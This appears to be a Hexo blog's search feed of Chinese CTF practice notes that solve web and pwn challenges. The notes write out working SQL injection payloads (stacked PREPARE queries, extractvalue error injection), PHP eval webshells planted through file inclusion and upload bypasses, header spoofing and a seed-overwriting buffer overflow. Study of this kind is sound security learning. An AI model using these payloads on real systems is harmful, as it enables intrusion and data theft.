<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>20-10-08</title>
    <link href="/2020/10/08/20-10-08/"/>
    <url>/2020/10/08/20-10-08/</url>
    
    <content type="html"><![CDATA[<p>supersqli(xctf)<br>进环境，处处提示可以sql注入。</p><ul><li>1’报错，1’#成功，字符串注入，同时可能报错注入</li><li>1’ order by 2#正常回显，1’ order by 3#错误，两行</li><li>1’ union select null,null#显示<div class="hljs"><pre><code class="hljs n1ql">returnpreg_match("/<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">",$inject);</span></code></pre></div></li><li>select被正则过滤了，联合注入和报错注入都走不通</li></ul><p>查看题解，发现存在<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a></p><ul><li>1’;show tables#  得到两个表名：words，1919810931114514</li><li>1’;show columns from `words` （反引号）</li><li>1‘;show columns from `1919810931114514`发现flag 列名</li><li>堆叠注入采用预编译方法绕过<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>用于设置变量名和值 <span class="hljs-keyword">prepare</span>用于预备一个语句，并赋予名称，以后可以引用该语句 <span class="hljs-keyword">execute</span>执行语句 <span class="hljs-keyword">deallocate</span>  <span class="hljs-keyword">prepare</span>用来释放掉预处理的语句</code></pre></div>payload:<div class="hljs"><pre><code class="hljs sql">1';<span class="hljs-keyword">set</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">'se'</span>,<span class="hljs-string">'lect flag from `1919810931114514`;'</span>);<span class="hljs-keyword">PREPARE</span> stml <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;<span class="hljs-keyword">execute</span> stml;<span class="hljs-comment">#</span></code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-10-7-踩住国庆的尾巴</title>
    <link href="/2020/10/07/20-10-7-%E8%B8%A9%E4%BD%8F%E5%9B%BD%E5%BA%86%E7%9A%84%E5%B0%BE%E5%B7%B4/"/>
    <url>/2020/10/07/20-10-7-%E8%B8%A9%E4%BD%8F%E5%9B%BD%E5%BA%86%E7%9A%84%E5%B0%BE%E5%B7%B4/</url>
    
    <content type="html"><![CDATA[<p>其实基本上每天都还在刷题，不过最近电脑上倒腾wsl2，把系统升级到了20H2版本，尝试用docker（太爱折腾了）。再加上pwn写题解的话会比较多，所以一直没有更新blog。<br><a id="more"></a></p><hr><p>win10 20H2 + wsl2</p><p>更新windows用了整整一个晚上，再开启wsl2，终于wsl2的ubuntu有了ip地址，十分符合我的需求。powershell7和Windows Terminal终于让我愿意用windows的powershell了。Windows Terminal用ubuntu默认打开的位置是User目录，进入windows目录终于不用通过mnt一点点的cd，进ubuntu root目录也很快，感觉二者的交互性加强了挺多，用起来挺舒服。</p><hr><p>用docker拉取作业环境</p><p>下了docker就想用，正好计算机网络安全最近的作业是用自制ssl证书配置web服务器，并分析握手协议和记录协议。是在不想用wsl安装apache2和openssl等一系列东西去摧残我那变红的C盘，也不想下载在windows里，就尝试用docker完成配置web服务器的任务。</p><p>结果就是从晚上7点开始做这个作业，到凌晨3点才完成: )，不清楚宿主机和docker的端口映射，之前拉的docker ubuntu端口都没开放，之后开了-p 80:80的端口映射，宿主机终于可以访问，但是ssl配置完后https连接打不开，又是一番折腾后发现还得再建立一个映射到443端口的映射，折腾到1点多才全部配置好，成功抓包。写报告写到3点才睡。。。</p><p>虽然像个傻子一样绕了很多弯路，不过倒是对docker有了更深的了解。</p><hr><p>回到ctf正题<br>level0、int overflow、cgpwn2、hello pwn(xctf)<br>基本都是栈方面的题，直接写收获好了：</p><p>python3使用pwntools时注意字符串和bytes不能隐式转换，和p32、p64这些函数一起构造payload时不要用字符串，而是使用bytes：前面加b。eg: b”a*0x30”</p><p>在进入函数前先将函数参数压栈，然后将返回地址压栈，然后跳转到函数内执行。要覆盖函数参数时注意要加上期望的函数返回地址！！！</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-10-04</title>
    <link href="/2020/10/04/20-10-04/"/>
    <url>/2020/10/04/20-10-04/</url>
    
    <content type="html"><![CDATA[<p>降转原因重学C，乘这个机会学学以前买的《C和指针》，感觉受益匪浅。<br><a id="more"></a></p><hr><p>guess_num(ichunqiu)<br>checksec查看一下防护：<br><img src="/2020/10/04/20-10-04/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-10-04%20163843.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>防护全开，真不错。<br>上IDA反编译<br><div class="hljs"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L);  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0L</span>L);  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0L</span>L);  v4 = <span class="hljs-number">0</span>;  v6 = <span class="hljs-number">0</span>;  *(_QWORD *)seed = sub_BB0();  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"-------------------------------"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to a guess number game!"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"-------------------------------"</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Please let me know your name!"</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your name:"</span>);  gets(&amp;v7);  srand(seed[<span class="hljs-number">0</span>]);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )  &#123;    v6 = rand() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"-------------Turn:%d-------------\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input your guess number:"</span>);    __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v4);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"---------------------------------"</span>);    <span class="hljs-keyword">if</span> ( v4 != v6 )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"GG!"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success!"</span>);  &#125;  sub_C3E();  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><br>大概就是要十次成功的猜中随机数。利用伪随机数原理想到控制种子。利用gets的漏洞可以成功覆盖seed内存。查看一下变量内存图：<br><img src="/2020/10/04/20-10-04/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-10-04%20164531.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>使用0x20个字符可以到seed，直接用40个’a’全部覆盖了<br>写个程序看看用4个’a’为种子会得到什么结果：<br><img src="/2020/10/04/20-10-04/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-10-04%20165008.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>得到5 6 4 6 6 2 3 6 2 2<br>运行程序依次输入即可得到flag<br><img src="/2020/10/04/20-10-04/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-10-04%20165422.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-10-3</title>
    <link href="/2020/10/03/20-10-3/"/>
    <url>/2020/10/03/20-10-3/</url>
    
    <content type="html"><![CDATA[<p>最近有点浮躁嗯， 很多题都不愿意去学习。得好好收拾下心情。<br>发现一直认为long long = int * int 不会溢出是错的，，转换过程应该是先求出int再隐式转成long long， 可能会溢出（一个动态规划居然两个小时才发现这个bug，大哭）<br><a id="more"></a></p><hr><p>Look(ichunqiu)<br>查看源码没有什么收获，    再查看请求头和响应头， 发现自定义响应头X-HT：verify。在请求头上加上，没有变化。通过GET传参：verify=123， 页面回显verify error!!。根据题目提示想到SQL注入。<br>尝试’or’1’=’1’%23显示长度太长，直接尝试payload: verify=’=’’%23依然不行，尝试verify=’=0%23成功注入。得到next page<br>访问后页面上只有hello。再一次查看源码以及http头， 还是有X-HT：viminfo响应头。考虑到viminfo文件泄露，访问.viminfo文件，成功得到viminfo文件。<br><div class="hljs"><pre><code class="hljs tap"><span class="hljs-comment"># This viminfo file was generated by Vim 7.3.</span><span class="hljs-comment"># You may edit it if you're careful!</span><span class="hljs-comment"># Value of 'encoding' when this file was written</span>*encoding=utf-8<span class="hljs-comment"># hlsearch on (H) or off (h):</span>~h<span class="hljs-comment"># Command Line History (newest to oldest):</span>:wq<span class="hljs-comment"># Search String History (newest to oldest):</span><span class="hljs-comment"># Expression History (newest to oldest):</span><span class="hljs-comment"># Input Line History (newest to oldest):</span><span class="hljs-comment"># Input Line History (newest to oldest):</span><span class="hljs-comment"># å¯„å­˜å™¨:</span><span class="hljs-comment"># æ–‡ä»¶æ ‡è®°:</span>'0 <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span> /var/www/icq/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~<span class="hljs-comment"># è·³è½¬åˆ—è¡¨ (ä»Žæ–°åˆ°æ—§):</span>-' <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span> /var/www/icq/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~<span class="hljs-comment"># æ–‡ä»¶å†…çš„æ ‡è®°åŽ†å²è®°å½• (ä»Žæ–°åˆ°æ—§):</span>&gt; /var/www/icq/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~"10</code></pre></div><br>访问5211ec9dde53ee65bb02225117fba1e1.php.backup失败，重新访问文件5211ec9dde53ee65bb02225117fba1e1.php.backup~~~ 成功（什么鬼文件名），得到php源码<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$con = mysql_connect(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">''</span>);</span><span class="php">mysql_query(<span class="hljs-string">"set names utf8"</span>);</span><span class="php">mysql_select_db(<span class="hljs-string">"ctf"</span>);</span><span class="php"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">"REMOTE_ADDR"</span>]==<span class="hljs-string">'8.8.8.8'</span>)&#123;</span><span class="php">    $name = addslashes($_GET[<span class="hljs-string">'usern3me'</span>]);</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">else</span>&#123;</span><span class="php">    <span class="hljs-keyword">if</span>(stripos($_GET[<span class="hljs-string">'usern3me'</span>],<span class="hljs-string">'Bctf2O16'</span>)!==<span class="hljs-keyword">false</span>)&#123;</span><span class="php">        $name = <span class="hljs-string">'FUCK'</span>;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">else</span>&#123;</span><span class="php">        $name = addslashes($_GET[<span class="hljs-string">'usern3me'</span>]);</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'hello '</span>.$name;</span><span class="php">$sql = <span class="hljs-string">"select * from admin where name='$name'"</span>;</span><span class="php">$result = mysql_query($sql);</span><span class="php">$num = mysql_num_rows($result);</span><span class="php"><span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;next ***.php'</span>;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><br>尝试宽字符注入失败，查找mysql字符集的文章：</p><ul><li><a href="https://skysec.top/2018/03/21/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%B7%B1%E5%85%A5mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E6%AF%94%E5%AF%B9%E6%96%B9%E6%B3%95collation/" target="_blank" rel="noopener">从一道题深入mysql字符集与比对方法collation</a></li><li><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a></li><li><a href="https://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">https://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a></li></ul><p>构造payload后成功注入得到next page信息<br>访问得到php源码：<br><div class="hljs"><pre><code class="hljs awk">&lt;?php  <span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path'</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]))&#123;  <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path'</span>];  <span class="hljs-variable">$name</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];  &#125;  <span class="hljs-keyword">else</span>&#123;  show_source(__FILE__);  <span class="hljs-keyword">exit</span>();  &#125;  <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">'..'</span>) &gt; -<span class="hljs-number">1</span>)&#123;  echo <span class="hljs-string">'WTF'</span>;  <span class="hljs-keyword">exit</span>();  &#125;    <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$path</span>,<span class="hljs-string">'http://127.0.0.1/'</span>) === <span class="hljs-number">0</span>)&#123;  file_put_contents(<span class="hljs-variable">$name</span>,file_get_contents(<span class="hljs-variable">$path</span>));  &#125;  <span class="hljs-keyword">else</span>&#123;  echo <span class="hljs-string">'path error'</span>;  &#125;  ?&gt;</code></pre></div><br>联系到上一步的sql注入上传木马，构造payload:<br>?filename=a.php&amp;path=<a href="http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=" target="_blank" rel="noopener">http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=</a>&lt;?php%20eval($_POST[a]);?&gt;<br>结果发现连上菜刀后usern3me被裁剪到了&lt;?php部分，注意到这里的请求是有二次编码的，%20修改为%25%32%30（空格二次编码），成功连上菜刀找到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-28</title>
    <link href="/2020/09/28/20-09-28/"/>
    <url>/2020/09/28/20-09-28/</url>
    
    <content type="html"><![CDATA[<p>嗯，新的一周<br><a id="more"></a></p><hr><p>OneThink(ichunqiu)<br>查看robots.txt发现flag.php文件，但是直接进去只有flag_is_not_here<br>百度onethink拿到到getshell的漏洞：<br><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">OneThink 二次开发前台Getshell分析</a><br>可以看到是在注册用户时的注入到onethink固定的缓存文件从而访问执行<br>注册两个账号（注意要在bp上抓包修改）: </p><ul><li>%0a$a=$GET_[a];//</li><li>%0aecho `$a`;//</li></ul><p>依次登录<br>进入/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php尝试传参a=ls执行成功，成功拿到shell。<br>再构造a=../../flag.php，查看源码得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-27</title>
    <link href="/2020/09/27/20-09-27/"/>
    <url>/2020/09/27/20-09-27/</url>
    
    <content type="html"><![CDATA[<p>不想学java的一天，，图形化编程讲的太碎了，感觉不太好。</p><hr><p>Vld(ichunqiu)<br>进入就是do you know Vulcan Logic Dumper?,顺便也帮我答了false，查看源码发现index.php.txt文件，进去有点像C的汇编语言，网上搜一下发现是zend引擎opcode(中间代码)<br><a href="https://www.php.net/manual/en/internals2.opcodes.php" target="_blank" rel="noopener">官方链接</a><br>大概需要知道的就是：</p><ul><li>ECHO 显然</li><li>ASSIGN 赋值(assigns value1 to result)，如!0=$a表示为operands中!0, $a</li><li>FETCH_R 获取变量并赋值<br><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20194550.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></li><li><p>FETCH_DIM_R对数组获取索引对应值并赋值给变量</p><p><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20194809.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p></li><li>JMPZ 在传来的值为0时跳转（注意是传到JMPZ行的值，即~0！！！）<br><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20195131.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>这题其他都比较好理解</li></ul><p>分析出的源代码大概逻辑如下：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'do you know Vulcan Logic Dumper?&lt;br&gt;'</span></span><span class="php">$a = $_GET[<span class="hljs-string">'flag1'</span>];</span><span class="php">$b = $_GET[<span class="hljs-string">'flag2'</span>];</span><span class="php">$c = $_GET[<span class="hljs-string">'flag3'</span>];</span><span class="php"><span class="hljs-keyword">if</span>($a== <span class="hljs-string">'fvhjjihfcv'</span>)&#123;</span><span class="php">    <span class="hljs-keyword">if</span>($b == <span class="hljs-string">'gfuyiyhioyf'</span>)&#123;</span><span class="php">        <span class="hljs-keyword">if</span>($c == <span class="hljs-string">'yugoiiyhi'</span>)&#123;</span><span class="php">            <span class="hljs-keyword">echo</span> <span class="hljs-string">'the+next+step+is+xxx.zip'</span>;</span><span class="php">        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span><span class="php">    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span><span class="php">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'</span></span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>根据源码构造payload后得到如下显示<br><pre><code class="hljs swift"><span class="hljs-keyword">do</span> you know <span class="hljs-type">Vulcan</span> <span class="hljs-type">Logic</span> <span class="hljs-type">Dumper?</span>  the next step <span class="hljs-keyword">is</span> 1chunqiu.<span class="hljs-built_in">zip</span></code></pre><br>下载审计应该是SQL漏洞，由于addslashes函数以及str_replace函数对username中number所含字段的替换，构造出payload: number=0&amp;username=%00’ 从而让单引号逃逸提前闭合查询语句<br><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from"</span>.<span class="hljs-string">"`"</span>.table_name.<span class="hljs-string">"`"</span>.<span class="hljs-string">"where username="</span>.<span class="hljs-string">"'"</span>.<span class="hljs-string">"<span class="hljs-variable">$username</span>"</span>.<span class="hljs-string">"'"</span></code></pre><br>由于addslashes,username首先变成\0\’，之后str_replace把0替换成空，username就变成了\\’，从而让单引号逃逸<br>进入1chunqiu/login.html尝试填写表单时注入发现不行，直接POST也不行。bp抓包发现POST查询时会变成login.php，直接抓包repeate。<br>回显是sql查询的报错信息，报错注入即可（只写username的值）：</p><ul><li>%00’ and extractvalue(1,concat(0x7e,user(),0x7e))#回显Unknown column ‘x72’ in ‘where clause’</li><li>改成%00’ and extractvalue(1,concat(1,user(),1))#回显user@localhost1，注入应该可行</li><li>%00’ and extractvalue(1,concat(1,database(),1))#得到数据库名ctf1</li><li>%00’ and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1))#得到两个表名flag以及users1</li><li>%00’ and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database()),1))#得到列名flag,username,password,number1</li><li>上一步按我原本习惯是table_name=’flag’，但是由于addslashes函数导致引号不能用，尝试用十六进制表示，但是str_replace函数会把0替换掉。尝试%df宽字符绕过不知道为什么也不行。尝试table_schema=database() limit 0,1也以为0存在不行。所幸这题数据库的列名不多，很容易就锁定在flag上</li><li>%00‘ and extractvalue(1,concat(1,(select flag from flag),1))#得到flag的一部分，发现没有闭合花括号，回显长度被限制</li><li>%00’ and extractvalue(1,concat(1,substr((select flag from flag),11),1))#显示后半部分，从而得到完整flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-26</title>
    <link href="/2020/09/26/20-09-26/"/>
    <url>/2020/09/26/20-09-26/</url>
    
    <content type="html"><![CDATA[<p>写完第一个自己的图形化程序后不想再编程了，做ctf冷静一下<br><a id="more"></a></p><hr><p>notebook(ichunqiu)<br>每次可以注木马都挺开心的<br>登录界面，查看源码，导航栏分别对应的链接是</p><ul><li>./</li><li>./action.php?module=php&amp;file=login</li><li>./action.php?module=php&amp;file=register</li></ul><p>没有其他信息，尝试用用户名admin密码password注册，跳转到index.php显示there is no flag（希望没记错），尝试爆破目录没有得到有用的页面，尝试robots.txt得到php1nFo.php，进去后就是php的信息页了。allow_url_include是关着的，放弃直接读的念头，到这一步就有点不知所措了。<br>看题解涨知识：</p><blockquote><p>open_basedir设置用户访问文件的活动范围，其指定的限制实际上是前缀,而不是目录名。 举个例子: 若”open_basedir =/dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都可访问。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成:”open_basedir =/dir/user/“<br>session.save_path是session文件存在的位置 session 的文件名格式为 sess_[PHPSESSID]，而sessionid 在发送的请求的 cookie 字段中PHPSESSID值也可以看到</p></blockquote><p>查看open_basedir只能访问tmp，页面上查找发现没有这个目录下的文件。。<br>根据题目提示的文件包含回到登录页面，分析url应该是把file和module拼接后就是访问的界面，尝试module=php&amp;file=php1nFo又是php信息页。</p><p>此时再次搜索tmp发现在session.save_path里有/tmp/SESS，尝试访问这个文件，构造payload：../../../tmp/SESS/sess_+cookie里面PHPSESSID的值，发现显示语言，用户名以及id，这里用户名是可以自己控制的，因此可以上传木马</p><p>重新注册，用户名构造为&lt;?php @eval($_POST[cmd]);?&gt;<br><em>这里之前尝试省去@以及用’cmd’结果都不行，引号可能是被过滤了？但是查资料@只是屏蔽警告信息，为什么不加上也不行呢？mark一下</em><br>之后就可以利用post进行shell啦</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-25</title>
    <link href="/2020/09/25/20-09-25/"/>
    <url>/2020/09/25/20-09-25/</url>
    
    <content type="html"><![CDATA[<p>emm，这几天沉迷在java图形化编程上，就做了一题，还没完全弄清楚。。<br><a id="more"></a><br>想做一个小小的工具箱，把一些写过的加密算法放进去。目前做出的东西连个选择界面和菜单都没，就干巴巴的DES加解密界面（写出来的简单DES加解密算法结果还和网上不一样 : )  ）<br><img src="/2020/09/25/20-09-25/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-25%20110948.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="一个不完全且简陋的工具~~箱~~页"></p><hr><p>hash(ichunqiu)<br>看源代码没有啥，直接点进链接，显示you are 123;if you are not 123,you can get the flag</p><p>查看源码发现提示hash是sign+key经过md5加密得到，且sign长度是8，用md5解密工具得到kkkkkk01123，所以sign是kkkkkk01，再由显示的内容改key，和sign结合后md5加密得到新的hash值提交，得到next step is Gu3ss_m3_h2h2.php<br>进去发现源码，修改变量个数绕过_wakeup函数，用+4代替4绕过正则过滤得到f15g_1s_here.php的源码，应该是利用eval执行操作。但是由于addslashes函数的过滤，不好通过闭合引号来执行，需要利用<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing" target="_blank" rel="noopener">双引号的变量解析</a><br>eval语句执行$value=”addslashes($val)”;命令，val是get得到，构造<code>payload: f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo `ls`;</code><br>关于构造的几点说明：</p><ul><li>本来习惯是{$}来利用变量解析，但是这道题把$放在{右边直接page don’t work，改成放在左边正常</li><li>由于addslashes会给单引号加上\， 因此直接使用a，此时会先把a当常量解析，在上下文中找不到a时，才当成索引引用</li><li>反引号 ` (执行运算符)在安全模式关闭时相当与shell_exec()，将其中内容当shell运行并返回结果</li><li>注意要有;分号！<br>再就是cat打开文件了</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-22</title>
    <link href="/2020/09/22/20-09-22/"/>
    <url>/2020/09/22/20-09-22/</url>
    
    <content type="html"><![CDATA[<p>Not Found(ichunqiu)<br>进去之后就是Not Found，看到404.php，源码没有发现什么，在响应头发现自定义响应头X-Method：haha。<br><a id="more"></a><br>先查看404.php，页面也显示haha，尝试对目录爆破搜索，基本全是404，在1.php的时候得到not here,plz trying，还是没什么用。<br>回到index.php，开始对X-Method研究，尝试各种请求头最后在OPTIONS发现响应头出现Location: ?f=1.php，添加到请求后发现1.php的源码。<br>但是尝试读取其他文件以及伪协议全都显示Not allowed file，查看wp发现apache有.htaccess文件：</p><blockquote><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><p>这就解释了大部分页面404被定制以及文件禁止访问的问题<br>访问后得到：</p><pre><code>RewriteEngine OnRewriteBase /RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L]</code></pre><p>发现一个页面被重写名成404.php，直接访问这个页面得到：</p><p>ip incorrect ???XFF???<br>看来是需要伪造IP，但是通过XFF伪造发现行不通，改用Client-Ip头进行伪造，得到flag</p><blockquote><p>remote_addr指的是当前直接请求的客户端IP地址，它存在于tcp请求体中，是http协议传输时自动添加的，不受请求头header所控制。所以，当客户端与服务器间不存在任何代理时，通过remote_addr获取客户端IP地址是最准确的，也是最安全的。</p><p>　　x-forwarded-for简称XFF，它其实和http协议本身并没什么关系，是很多代理服务器在请求转发时添加上去的。如果客户端和服务器之间存在代理服务器，那么直接通过remote_addr获取的IP就是代理服务器的地址，并不是客户端真实的IP地址。因此，需要代理服务器（通常是反向代理服务器）将真实客户端的IP地址转发给服务器，转发时客户端的真实IP地址通常就存在于x-forwarded-for请求头中。</p><p>　　client-ip同x-forwarded-for，也是代理服务器添加的用于转发客户端请求的真实IP地址，同样保存于请求头中。</p></blockquote><hr><p>upload(ichunqiu第一届百度杯总决赛线上选拔赛)<br>以为是个缝合怪，结果我错了</p><p>首先是响应头中的flag两次base64decode得到真正的flag，由于会变化python脚本上传得到Path，进入就是登录界面了</p><p>以为依然是md5碰撞加上SQL注入，结果显示error，查看wp发现是svn源码泄露。<br><a href="https://www.cnblogs.com/Lmg66/p/13598803.html" target="_blank" rel="noopener">ctf常见源码泄露</a><br><a href="https://zhuanlan.zhihu.com/p/27014481" target="_blank" rel="noopener">啊哈，还有一个</a><br>找到/.svn/wc.db，提示My username is md5(HEL10W10rDEveryOn3)，MD5加密得到username，成功登录。</p><p>之后是文件上传漏洞，尝试jpg后缀拦包改成php后缀，发现上传失败：JPG!!!，改Content-Type尝试绕过waf，上传成功但是后缀被改成jpg，考虑是后缀黑名单，依然是php2,php3,php4,php5,phps,pht,phtm,phtml各种尝试，发现pht成功并直接得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20-09-21</title>
    <link href="/2020/09/21/20-09-21/"/>
    <url>/2020/09/21/20-09-21/</url>
    
